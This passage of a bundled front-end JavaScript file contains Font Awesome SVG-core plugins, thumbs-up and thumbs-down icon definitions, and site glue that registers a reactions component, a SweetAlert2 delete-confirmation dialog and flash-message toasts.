        return Promise.resolve([node, makeLayersTextAbstract({
          content: node.innerHTML,
          width,
          height,
          transform,
          title,
          extra,
          watchable: true
        })]);
      };
    }
  };
  var CLEAN_CONTENT_PATTERN = new RegExp('"', "ug");
  var SECONDARY_UNICODE_RANGE = [1105920, 1112319];
  var _FONT_FAMILY_WEIGHT_TO_PREFIX = {
    ...{
      FontAwesome: {
        normal: "fas",
        400: "fas"
      }
    },
    ...eo,
    ...ao,
    ...mo
  };
  var FONT_FAMILY_WEIGHT_TO_PREFIX = Object.keys(_FONT_FAMILY_WEIGHT_TO_PREFIX).reduce((acc, key) => {
    acc[key.toLowerCase()] = _FONT_FAMILY_WEIGHT_TO_PREFIX[key];
    return acc;
  }, {});
  var FONT_FAMILY_WEIGHT_FALLBACK = Object.keys(FONT_FAMILY_WEIGHT_TO_PREFIX).reduce((acc, fontFamily) => {
    const weights = FONT_FAMILY_WEIGHT_TO_PREFIX[fontFamily];
    acc[fontFamily] = weights[900] || [...Object.entries(weights)][0][1];
    return acc;
  }, {});
  function hexValueFromContent(content) {
    const cleaned = content.replace(CLEAN_CONTENT_PATTERN, "");
    const codePoint = codePointAt(cleaned, 0);
    const isPrependTen = codePoint >= SECONDARY_UNICODE_RANGE[0] && codePoint <= SECONDARY_UNICODE_RANGE[1];
    const isDoubled = cleaned.length === 2 ? cleaned[0] === cleaned[1] : false;
    return {
      value: isDoubled ? toHex(cleaned[0]) : toHex(cleaned),
      isSecondary: isPrependTen || isDoubled
    };
  }
  function getPrefix(fontFamily, fontWeight) {
    const fontFamilySanitized = fontFamily.replace(/^['"]|['"]$/g, "").toLowerCase();
    const fontWeightInteger = parseInt(fontWeight);
    const fontWeightSanitized = isNaN(fontWeightInteger) ? "normal" : fontWeightInteger;
    return (FONT_FAMILY_WEIGHT_TO_PREFIX[fontFamilySanitized] || {})[fontWeightSanitized] || FONT_FAMILY_WEIGHT_FALLBACK[fontFamilySanitized];
  }
  function replaceForPosition(node, position) {
    const pendingAttribute = "".concat(DATA_FA_PSEUDO_ELEMENT_PENDING).concat(position.replace(":", "-"));
    return new Promise((resolve, reject) => {
      if (node.getAttribute(pendingAttribute) !== null) {
        return resolve();
      }
      const children = toArray2(node.children);
      const alreadyProcessedPseudoElement = children.filter((c2) => c2.getAttribute(DATA_FA_PSEUDO_ELEMENT) === position)[0];
      const styles2 = WINDOW.getComputedStyle(node, position);
      const fontFamily = styles2.getPropertyValue("font-family");
      const fontFamilyMatch = fontFamily.match(FONT_FAMILY_PATTERN);
      const fontWeight = styles2.getPropertyValue("font-weight");
      const content = styles2.getPropertyValue("content");
      if (alreadyProcessedPseudoElement && !fontFamilyMatch) {
        node.removeChild(alreadyProcessedPseudoElement);
        return resolve();
      } else if (fontFamilyMatch && content !== "none" && content !== "") {
        const content2 = styles2.getPropertyValue("content");
        let prefix2 = getPrefix(fontFamily, fontWeight);
        const {
          value: hexValue,
          isSecondary
        } = hexValueFromContent(content2);
        const isV4 = fontFamilyMatch[0].startsWith("FontAwesome");
        let iconName = byUnicode(prefix2, hexValue);
        let iconIdentifier = iconName;
        if (isV4) {
          const iconName4 = byOldUnicode(hexValue);
          if (iconName4.iconName && iconName4.prefix) {
            iconName = iconName4.iconName;
            prefix2 = iconName4.prefix;
          }
        }
        if (iconName && !isSecondary && (!alreadyProcessedPseudoElement || alreadyProcessedPseudoElement.getAttribute(DATA_PREFIX) !== prefix2 || alreadyProcessedPseudoElement.getAttribute(DATA_ICON) !== iconIdentifier)) {
          node.setAttribute(pendingAttribute, iconIdentifier);
          if (alreadyProcessedPseudoElement) {
            node.removeChild(alreadyProcessedPseudoElement);
          }
          const meta = blankMeta();
          const {
            extra
          } = meta;
          extra.attributes[DATA_FA_PSEUDO_ELEMENT] = position;
          findIcon(iconName, prefix2).then((main) => {
            const abstract = makeInlineSvgAbstract({
              ...meta,
              icons: {
                main,
                mask: emptyCanonicalIcon()
              },
              prefix: prefix2,
              iconName: iconIdentifier,
              extra,
              watchable: true
            });
            const element = DOCUMENT.createElementNS("http://www.w3.org/2000/svg", "svg");
            if (position === "::before") {
              node.insertBefore(element, node.firstChild);
            } else {
              node.appendChild(element);
            }
            element.outerHTML = abstract.map((a2) => toHtml(a2)).join("\n");
            node.removeAttribute(pendingAttribute);
            resolve();
          }).catch(reject);
        } else {
          resolve();
        }
      } else {
        resolve();
      }
    });
  }
  function replace(node) {
    return Promise.all([replaceForPosition(node, "::before"), replaceForPosition(node, "::after")]);
  }
  function processable(node) {
    return node.parentNode !== document.head && !~TAGNAMES_TO_SKIP_FOR_PSEUDOELEMENTS.indexOf(node.tagName.toUpperCase()) && !node.getAttribute(DATA_FA_PSEUDO_ELEMENT) && (!node.parentNode || node.parentNode.tagName !== "svg");
  }
  function searchPseudoElements(root) {
    if (!IS_DOM) return;
    return new Promise((resolve, reject) => {
      const operations = toArray2(root.querySelectorAll("*")).filter(processable).map(replace);
      const end2 = perf.begin("searchPseudoElements");
      disableObservation();
      Promise.all(operations).then(() => {
        end2();
        enableObservation();
        resolve();
      }).catch(() => {
        end2();
        enableObservation();
        reject();
      });
    });
  }
  var PseudoElements = {
    hooks() {
      return {
        mutationObserverCallbacks(accumulator) {
          accumulator.pseudoElementsCallback = searchPseudoElements;
          return accumulator;
        }
      };
    },
    provides(providers2) {
      providers2.pseudoElements2svg = function(params) {
        const {
          node = DOCUMENT
        } = params;
        if (config.searchPseudoElements) {
          searchPseudoElements(node);
        }
      };
    }
  };
  var _unwatched = false;
  var MutationObserver$1 = {
    mixout() {
      return {
        dom: {
          unwatch() {
            disableObservation();
            _unwatched = true;
          }
        }
      };
    },
    hooks() {
      return {
        bootstrap() {
          observe(chainHooks("mutationObserverCallbacks", {}));
        },
        noAuto() {
          disconnect();
        },
        watch(params) {
          const {
            observeMutationsRoot
          } = params;
          if (_unwatched) {
            enableObservation();
          } else {
            observe(chainHooks("mutationObserverCallbacks", {
              observeMutationsRoot
            }));
          }
        }
      };
    }
  };
  var parseTransformString = (transformString) => {
    let transform = {
      size: 16,
      x: 0,
      y: 0,
      flipX: false,
      flipY: false,
      rotate: 0
    };
    return transformString.toLowerCase().split(" ").reduce((acc, n) => {
      const parts = n.toLowerCase().split("-");
      const first = parts[0];
      let rest = parts.slice(1).join("-");
      if (first && rest === "h") {
        acc.flipX = true;
        return acc;
      }
      if (first && rest === "v") {
        acc.flipY = true;
        return acc;
      }
      rest = parseFloat(rest);
      if (isNaN(rest)) {
        return acc;
      }
      switch (first) {
        case "grow":
          acc.size = acc.size + rest;
          break;
        case "shrink":
          acc.size = acc.size - rest;
          break;
        case "left":
          acc.x = acc.x - rest;
          break;
        case "right":
          acc.x = acc.x + rest;
          break;
        case "up":
          acc.y = acc.y - rest;
          break;
        case "down":
          acc.y = acc.y + rest;
          break;
        case "rotate":
          acc.rotate = acc.rotate + rest;
          break;
      }
      return acc;
    }, transform);
  };
  var PowerTransforms = {
    mixout() {
      return {
        parse: {
          transform: (transformString) => {
            return parseTransformString(transformString);
          }
        }
      };
    },
    hooks() {
      return {
        parseNodeAttributes(accumulator, node) {
          const transformString = node.getAttribute("data-fa-transform");
          if (transformString) {
            accumulator.transform = parseTransformString(transformString);
          }
          return accumulator;
        }
      };
    },
    provides(providers2) {
      providers2.generateAbstractTransformGrouping = function(_ref) {
        let {
          main,
          transform,
          containerWidth,
          iconWidth
        } = _ref;
        const outer = {
          transform: "translate(".concat(containerWidth / 2, " 256)")
        };
        const innerTranslate = "translate(".concat(transform.x * 32, ", ").concat(transform.y * 32, ") ");
        const innerScale = "scale(".concat(transform.size / 16 * (transform.flipX ? -1 : 1), ", ").concat(transform.size / 16 * (transform.flipY ? -1 : 1), ") ");
        const innerRotate = "rotate(".concat(transform.rotate, " 0 0)");
        const inner = {
          transform: "".concat(innerTranslate, " ").concat(innerScale, " ").concat(innerRotate)
        };
        const path = {
          transform: "translate(".concat(iconWidth / 2 * -1, " -256)")
        };
        const operations = {
          outer,
          inner,
          path
        };
        return {
          tag: "g",
          attributes: {
            ...operations.outer
          },
          children: [{
            tag: "g",
            attributes: {
              ...operations.inner
            },
            children: [{
              tag: main.icon.tag,
              children: main.icon.children,
              attributes: {
                ...main.icon.attributes,
                ...operations.path
              }
            }]
          }]
        };
      };
    }
  };
  var ALL_SPACE = {
    x: 0,
    y: 0,
    width: "100%",
    height: "100%"
  };
  function fillBlack(abstract) {
    let force = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : true;
    if (abstract.attributes && (abstract.attributes.fill || force)) {
      abstract.attributes.fill = "black";
    }
    return abstract;
  }
  function deGroup(abstract) {
    if (abstract.tag === "g") {
      return abstract.children;
    } else {
      return [abstract];
    }
  }
  var Masks = {
    hooks() {
      return {
        parseNodeAttributes(accumulator, node) {
          const maskData = node.getAttribute("data-fa-mask");
          const mask = !maskData ? emptyCanonicalIcon() : getCanonicalIcon(maskData.split(" ").map((i) => i.trim()));
          if (!mask.prefix) {
            mask.prefix = getDefaultUsablePrefix();
          }
          accumulator.mask = mask;
          accumulator.maskId = node.getAttribute("data-fa-mask-id");
          return accumulator;
        }
      };
    },
    provides(providers2) {
      providers2.generateAbstractMask = function(_ref) {
        let {
          children,
          attributes,
          main,
          mask,
          maskId: explicitMaskId,
          transform
        } = _ref;
        const {
          width: mainWidth,
          icon: mainPath
        } = main;
        const {
          width: maskWidth,
          icon: maskPath
        } = mask;
        const trans = transformForSvg({
          transform,
          containerWidth: maskWidth,
          iconWidth: mainWidth
        });
        const maskRect = {
          tag: "rect",
          attributes: {
            ...ALL_SPACE,
            fill: "white"
          }
        };
        const maskInnerGroupChildrenMixin = mainPath.children ? {
          children: mainPath.children.map(fillBlack)
        } : {};
        const maskInnerGroup = {
          tag: "g",
          attributes: {
            ...trans.inner
          },
          children: [fillBlack({
            tag: mainPath.tag,
            attributes: {
              ...mainPath.attributes,
              ...trans.path
            },
            ...maskInnerGroupChildrenMixin
          })]
        };
        const maskOuterGroup = {
          tag: "g",
          attributes: {
            ...trans.outer
          },
          children: [maskInnerGroup]
        };
        const maskId = "mask-".concat(explicitMaskId || nextUniqueId());
        const clipId = "clip-".concat(explicitMaskId || nextUniqueId());
        const maskTag = {
          tag: "mask",
          attributes: {
            ...ALL_SPACE,
            id: maskId,
            maskUnits: "userSpaceOnUse",
            maskContentUnits: "userSpaceOnUse"
          },
          children: [maskRect, maskOuterGroup]
        };
        const defs = {
          tag: "defs",
          children: [{
            tag: "clipPath",
            attributes: {
              id: clipId
            },
            children: deGroup(maskPath)
          }, maskTag]
        };
        children.push(defs, {
          tag: "rect",
          attributes: {
            fill: "currentColor",
            "clip-path": "url(#".concat(clipId, ")"),
            mask: "url(#".concat(maskId, ")"),
            ...ALL_SPACE
          }
        });
        return {
          children,
          attributes
        };
      };
    }
  };
  var MissingIconIndicator = {
    provides(providers2) {
      let reduceMotion = false;
      if (WINDOW.matchMedia) {
        reduceMotion = WINDOW.matchMedia("(prefers-reduced-motion: reduce)").matches;
      }
      providers2.missingIconAbstract = function() {
        const gChildren = [];
        const FILL = {
          fill: "currentColor"
        };
        const ANIMATION_BASE = {
          attributeType: "XML",
          repeatCount: "indefinite",
          dur: "2s"
        };
        gChildren.push({
          tag: "path",
          attributes: {
            ...FILL,
            d: "M156.5,447.7l-12.6,29.5c-18.7-9.5-35.9-21.2-51.5-34.9l22.7-22.7C127.6,430.5,141.5,440,156.5,447.7z M40.6,272H8.5 c1.4,21.2,5.4,41.7,11.7,61.1L50,321.2C45.1,305.5,41.8,289,40.6,272z M40.6,240c1.4-18.8,5.2-37,11.1-54.1l-29.5-12.6 C14.7,194.3,10,216.7,8.5,240H40.6z M64.3,156.5c7.8-14.9,17.2-28.8,28.1-41.5L69.7,92.3c-13.7,15.6-25.5,32.8-34.9,51.5 L64.3,156.5z M397,419.6c-13.9,12-29.4,22.3-46.1,30.4l11.9,29.8c20.7-9.9,39.8-22.6,56.9-37.6L397,419.6z M115,92.4 c13.9-12,29.4-22.3,46.1-30.4l-11.9-29.8c-20.7,9.9-39.8,22.6-56.8,37.6L115,92.4z M447.7,355.5c-7.8,14.9-17.2,28.8-28.1,41.5 l22.7,22.7c13.7-15.6,25.5-32.9,34.9-51.5L447.7,355.5z M471.4,272c-1.4,18.8-5.2,37-11.1,54.1l29.5,12.6 c7.5-21.1,12.2-43.5,13.6-66.8H471.4z M321.2,462c-15.7,5-32.2,8.2-49.2,9.4v32.1c21.2-1.4,41.7-5.4,61.1-11.7L321.2,462z M240,471.4c-18.8-1.4-37-5.2-54.1-11.1l-12.6,29.5c21.1,7.5,43.5,12.2,66.8,13.6V471.4z M462,190.8c5,15.7,8.2,32.2,9.4,49.2h32.1 c-1.4-21.2-5.4-41.7-11.7-61.1L462,190.8z M92.4,397c-12-13.9-22.3-29.4-30.4-46.1l-29.8,11.9c9.9,20.7,22.6,39.8,37.6,56.9 L92.4,397z M272,40.6c18.8,1.4,36.9,5.2,54.1,11.1l12.6-29.5C317.7,14.7,295.3,10,272,8.5V40.6z M190.8,50 c15.7-5,32.2-8.2,49.2-9.4V8.5c-21.2,1.4-41.7,5.4-61.1,11.7L190.8,50z M442.3,92.3L419.6,115c12,13.9,22.3,29.4,30.5,46.1 l29.8-11.9C470,128.5,457.3,109.4,442.3,92.3z M397,92.4l22.7-22.7c-15.6-13.7-32.8-25.5-51.5-34.9l-12.6,29.5 C370.4,72.1,384.4,81.5,397,92.4z"
          }
        });
        const OPACITY_ANIMATE = {
          ...ANIMATION_BASE,
          attributeName: "opacity"
        };
        const dot = {
          tag: "circle",
          attributes: {
            ...FILL,
            cx: "256",
            cy: "364",
            r: "28"
          },
          children: []
        };
        if (!reduceMotion) {
          dot.children.push({
            tag: "animate",
            attributes: {
              ...ANIMATION_BASE,
              attributeName: "r",
              values: "28;14;28;28;14;28;"
            }
          }, {
            tag: "animate",
            attributes: {
              ...OPACITY_ANIMATE,
              values: "1;0;1;1;0;1;"
            }
          });
        }
        gChildren.push(dot);
        gChildren.push({
          tag: "path",
          attributes: {
            ...FILL,
            opacity: "1",
            d: "M263.7,312h-16c-6.6,0-12-5.4-12-12c0-71,77.4-63.9,77.4-107.8c0-20-17.8-40.2-57.4-40.2c-29.1,0-44.3,9.6-59.2,28.7 c-3.9,5-11.1,6-16.2,2.4l-13.1-9.2c-5.6-3.9-6.9-11.8-2.6-17.2c21.2-27.2,46.4-44.7,91.2-44.7c52.3,0,97.4,29.8,97.4,80.2 c0,67.6-77.4,63.5-77.4,107.8C275.7,306.6,270.3,312,263.7,312z"
          },
          children: reduceMotion ? [] : [{
            tag: "animate",
            attributes: {
              ...OPACITY_ANIMATE,
              values: "1;0;0;0;0;1;"
            }
          }]
        });
        if (!reduceMotion) {
          gChildren.push({
            tag: "path",
            attributes: {
              ...FILL,
              opacity: "0",
              d: "M232.5,134.5l7,168c0.3,6.4,5.6,11.5,12,11.5h9c6.4,0,11.7-5.1,12-11.5l7-168c0.3-6.8-5.2-12.5-12-12.5h-23 C237.7,122,232.2,127.7,232.5,134.5z"
            },
            children: [{
              tag: "animate",
              attributes: {
                ...OPACITY_ANIMATE,
                values: "0;0;1;1;0;0;"
              }
            }]
          });
        }
        return {
          tag: "g",
          attributes: {
            "class": "missing"
          },
          children: gChildren
        };
      };
    }
  };
  var SvgSymbols = {
    hooks() {
      return {
        parseNodeAttributes(accumulator, node) {
          const symbolData = node.getAttribute("data-fa-symbol");
          const symbol = symbolData === null ? false : symbolData === "" ? true : symbolData;
          accumulator["symbol"] = symbol;
          return accumulator;
        }
      };
    }
  };
  var plugins = [InjectCSS, ReplaceElements, Layers, LayersCounter, LayersText, PseudoElements, MutationObserver$1, PowerTransforms, Masks, MissingIconIndicator, SvgSymbols];
  registerPlugins(plugins, {
    mixoutsTo: api
  });
  var noAuto$1 = api.noAuto;
  var config$1 = api.config;
  var library$1 = api.library;
  var dom$1 = api.dom;
  var parse$1 = api.parse;
  var findIconDefinition$1 = api.findIconDefinition;
  var toHtml$1 = api.toHtml;
  var icon = api.icon;
  var layer = api.layer;
  var text = api.text;
  var counter = api.counter;

  // node_modules/@fortawesome/free-solid-svg-icons/index.mjs
  var faThumbsDown = {
    prefix: "fas",
    iconName: "thumbs-down",
    icon: [512, 512, [128078, 61576], "f165", "M313.4 479.1c26-5.2 42.9-30.5 37.7-56.5l-2.3-11.4c-5.3-26.7-15.1-52.1-28.8-75.2l144 0c26.5 0 48-21.5 48-48c0-18.5-10.5-34.6-25.9-42.6C497 236.6 504 223.1 504 208c0-23.4-16.8-42.9-38.9-47.1c4.4-7.3 6.9-15.8 6.9-24.9c0-21.3-13.9-39.4-33.1-45.6c.7-3.3 1.1-6.8 1.1-10.4c0-26.5-21.5-48-48-48l-97.5 0c-19 0-37.5 5.6-53.3 16.1L202.7 73.8C176 91.6 160 121.6 160 153.7l0 38.3 0 48 0 24.9c0 29.2 13.3 56.7 36 75l7.4 5.9c26.5 21.2 44.6 51 51.2 84.2l2.3 11.4c5.2 26 30.5 42.9 56.5 37.7zM32 384l64 0c17.7 0 32-14.3 32-32l0-224c0-17.7-14.3-32-32-32L32 96C14.3 96 0 110.3 0 128L0 352c0 17.7 14.3 32 32 32z"]
  };
  var faThumbsUp = {
    prefix: "fas",
    iconName: "thumbs-up",
    icon: [512, 512, [128077, 61575], "f164", "M313.4 32.9c26 5.2 42.9 30.5 37.7 56.5l-2.3 11.4c-5.3 26.7-15.1 52.1-28.8 75.2l144 0c26.5 0 48 21.5 48 48c0 18.5-10.5 34.6-25.9 42.6C497 275.4 504 288.9 504 304c0 23.4-16.8 42.9-38.9 47.1c4.4 7.3 6.9 15.8 6.9 24.9c0 21.3-13.9 39.4-33.1 45.6c.7 3.3 1.1 6.8 1.1 10.4c0 26.5-21.5 48-48 48l-97.5 0c-19 0-37.5-5.6-53.3-16.1l-38.5-25.7C176 420.4 160 390.4 160 358.3l0-38.3 0-48 0-24.9c0-29.2 13.3-56.7 36-75l7.4-5.9c26.5-21.2 44.6-51 51.2-84.2l2.3-11.4c5.2-26 30.5-42.9 56.5-37.7zM32 192l64 0c17.7 0 32 14.3 32 32l0 224c0 17.7-14.3 32-32 32l-64 0c-17.7 0-32-14.3-32-32L0 224c0-17.7 14.3-32 32-32z"]
  };

  // node_modules/@fortawesome/free-regular-svg-icons/index.mjs
  var faThumbsDown2 = {
    prefix: "far",
    iconName: "thumbs-down",
    icon: [512, 512, [128078, 61576], "f165", "M323.8 477.2c-38.2 10.9-78.1-11.2-89-49.4l-5.7-20c-3.7-13-10.4-25-19.5-35l-51.3-56.4c-8.9-9.8-8.2-25 1.6-33.9s25-8.2 33.9 1.6l51.3 56.4c14.1 15.5 24.4 34 30.1 54.1l5.7 20c3.6 12.7 16.9 20.1 29.7 16.5s20.1-16.9 16.5-29.7l-5.7-20c-5.7-19.9-14.7-38.7-26.6-55.5c-5.2-7.3-5.8-16.9-1.7-24.9s12.3-13 21.3-13L448 288c8.8 0 16-7.2 16-16c0-6.8-4.3-12.7-10.4-15c-7.4-2.8-13-9-14.9-16.7s.1-15.8 5.3-21.7c2.5-2.8 4-6.5 4-10.6c0-7.8-5.6-14.3-13-15.7c-8.2-1.6-15.1-7.3-18-15.2s-1.6-16.7 3.6-23.3c2.1-2.7 3.4-6.1 3.4-9.9c0-6.7-4.2-12.6-10.2-14.9c-11.5-4.5-17.7-16.9-14.4-28.8c.4-1.3 .6-2.8 .6-4.3c0-8.8-7.2-16-16-16l-97.5 0c-12.6 0-25 3.7-35.5 10.7l-61.7 41.1c-11 7.4-25.9 4.4-33.3-6.7s-4.4-25.9 6.7-33.3l61.7-41.1c18.4-12.3 40-18.8 62.1-18.8L384 32c34.7 0 62.9 27.6 64 62c14.6 11.7 24 29.7 24 50c0 4.5-.5 8.8-1.3 13c15.4 11.7 25.3 30.2 25.3 51c0 6.5-1 12.8-2.8 18.7C504.8 238.3 512 254.3 512 272c0 35.3-28.6 64-64 64l-92.3 0c4.7 10.4 8.7 21.2 11.8 32.2l5.7 20c10.9 38.2-11.2 78.1-49.4 89zM32 384c-17.7 0-32-14.3-32-32L0 128c0-17.7 14.3-32 32-32l64 0c17.7 0 32 14.3 32 32l0 224c0 17.7-14.3 32-32 32l-64 0z"]
  };
  var faThumbsUp2 = {
    prefix: "far",
    iconName: "thumbs-up",
    icon: [512, 512, [128077, 61575], "f164", "M323.8 34.8c-38.2-10.9-78.1 11.2-89 49.4l-5.7 20c-3.7 13-10.4 25-19.5 35l-51.3 56.4c-8.9 9.8-8.2 25 1.6 33.9s25 8.2 33.9-1.6l51.3-56.4c14.1-15.5 24.4-34 30.1-54.1l5.7-20c3.6-12.7 16.9-20.1 29.7-16.5s20.1 16.9 16.5 29.7l-5.7 20c-5.7 19.9-14.7 38.7-26.6 55.5c-5.2 7.3-5.8 16.9-1.7 24.9s12.3 13 21.3 13L448 224c8.8 0 16 7.2 16 16c0 6.8-4.3 12.7-10.4 15c-7.4 2.8-13 9-14.9 16.7s.1 15.8 5.3 21.7c2.5 2.8 4 6.5 4 10.6c0 7.8-5.6 14.3-13 15.7c-8.2 1.6-15.1 7.3-18 15.2s-1.6 16.7 3.6 23.3c2.1 2.7 3.4 6.1 3.4 9.9c0 6.7-4.2 12.6-10.2 14.9c-11.5 4.5-17.7 16.9-14.4 28.8c.4 1.3 .6 2.8 .6 4.3c0 8.8-7.2 16-16 16l-97.5 0c-12.6 0-25-3.7-35.5-10.7l-61.7-41.1c-11-7.4-25.9-4.4-33.3 6.7s-4.4 25.9 6.7 33.3l61.7 41.1c18.4 12.3 40 18.8 62.1 18.8l97.5 0c34.7 0 62.9-27.6 64-62c14.6-11.7 24-29.7 24-50c0-4.5-.5-8.8-1.3-13c15.4-11.7 25.3-30.2 25.3-51c0-6.5-1-12.8-2.8-18.7C504.8 273.7 512 257.7 512 240c0-35.3-28.6-64-64-64l-92.3 0c4.7-10.4 8.7-21.2 11.8-32.2l5.7-20c10.9-38.2-11.2-78.1-49.4-89zM32 192c-17.7 0-32 14.3-32 32L0 448c0 17.7 14.3 32 32 32l64 0c17.7 0 32-14.3 32-32l0-224c0-17.7-14.3-32-32-32l-64 0z"]
  };

  // src/scripts/fontawesome.js
  library$1.add(faThumbsDown, faThumbsDown2, faThumbsUp, faThumbsUp2);
  dom$1.i2svg();
  module_default.data("reactions_post", () => ({
    init() {
      dom$1.i2svg();
    }
  }));

  // src/scripts/alert.js
  var import_sweetalert2 = __toESM(require_sweetalert2_all());
  var flashAlert = import_sweetalert2.default.mixin({
    toast: true,
    position: "top-end",
    showConfirmButton: false,
    timer: 1500,
    didOpen: (toast) => {
      toast.onmouseenter = import_sweetalert2.default.stopTimer;
      toast.onmouseleave = import_sweetalert2.default.resumeTimer;
    }
  });
  var swalWithBootstrapButtons = import_sweetalert2.default.mixin({
    customClass: {
      confirmButton: "btn btn-success",
      cancelButton: "btn btn-danger"
    },
    buttonsStyling: false,
    showCancelButton: true,
    confirmButtonText: "Yes, do it !",
    cancelButtonText: "No, cancel !",
    reverseButtons: true
  });
  module_default.data("confirm_msg", () => ({
    confirmDelete(msg) {
      swalWithBootstrapButtons.fire({
        title: "Are you sure?",
        text: msg,
        icon: "warning"
      }).then((result) => {
        if (result.isConfirmed) {
          this.$el.submit();
        }
      });
    }
  }));
  module_default.data("flash_msg", () => ({
    init() {
      const msg = this.$el.dataset.msg;
      const tag = this.$el.dataset.tag;
      flashAlert.fire({
        icon: tag,
        title: msg
      });
    }
  }));
  module_default.start();
})();
/*! Bundled license information:

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.13.3
  * Released under the MIT License.
  *)
*/
